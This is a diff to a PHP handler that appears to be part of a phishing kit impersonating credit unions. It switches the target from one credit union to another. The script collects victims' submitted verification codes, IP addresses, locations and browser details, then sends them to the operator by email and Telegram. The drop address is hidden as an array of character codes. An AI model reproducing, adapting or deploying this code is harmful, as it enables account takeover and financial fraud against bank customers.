@@ -7,7 +7,7 @@ $Port = getenv("REMOTE_PORT");
 $browser = $_SERVER['HTTP_USER_AGENT'];
 $adddate=date("D M d, Y g:i a");
 $subject = "Telegram ID: @famozz**";
-$message = "**Telegram ID: @famozz *WILLAMETE CU CODE***+++\n";
+$message = "**Telegram ID: @famozz *KINSTON CU CODE***+++\n";
 $message .= "CODE : ".$_POST['1']."\n";
 $message .= "User-!P : ".$ip."\n";
 $message .= "Country : ".$country."\n\n";
@@ -17,7 +17,7 @@ $message .= "User-Agent: ".$browser."\n";
 $headers = "From: famoz";
 @mail($send,$subject,$message,$headers);
 send_telegram_msg($message);
-header("location:Verif2.php");
+header("location:cancel.php");
 function country_sort(){
   $sorter = "";
   $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
@@ -56,4 +56,5 @@ function visitor_country()
     return $result;
 }
 ?>
+
 
